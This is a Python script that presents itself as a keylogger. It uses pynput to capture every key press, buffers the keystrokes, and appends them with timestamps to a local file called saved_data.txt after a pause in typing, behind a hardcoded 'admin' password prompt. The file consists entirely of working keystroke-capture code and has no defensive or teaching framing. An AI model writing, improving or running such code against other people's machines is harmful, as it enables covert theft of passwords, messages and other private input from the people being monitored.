from os import write
from time import sleep
from threading import Thread
from sys import exit
from datetime import datetime
from pynput.keyboard import Listener

def timer_thread():
    counter = 0
    handler = ''
    while True:
        if handler == queue: counter += 1
        else: counter = 0 
        if counter == 5: save()
        handler = queue
        sleep(1.25)

def write_to_queue(data):
    global queue
    if len(str(data))<=3: data = str(data)[1:-1]
    else: data = f' {data} '
    queue = str(queue) + str(data)

def save():
    global queue
    print(f"saving {queue}")
    with open("saved_data.txt", "a", encoding="utf-8") as f:
        time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        try: f.write(f'\n{time} - {str(queue)}')
        except: f.write(f'\n{time} - undefined signs')
        queue = ''

def main():
    if str(input("type password: ")) == "admin":
        print("\* keylogger is running */")
        timer.start()
        with Listener(on_press=write_to_queue) as l: l.join()

if __name__ == "__main__":
    queue = ''
    timer = Thread(target=timer_thread)
    run = True
    main()
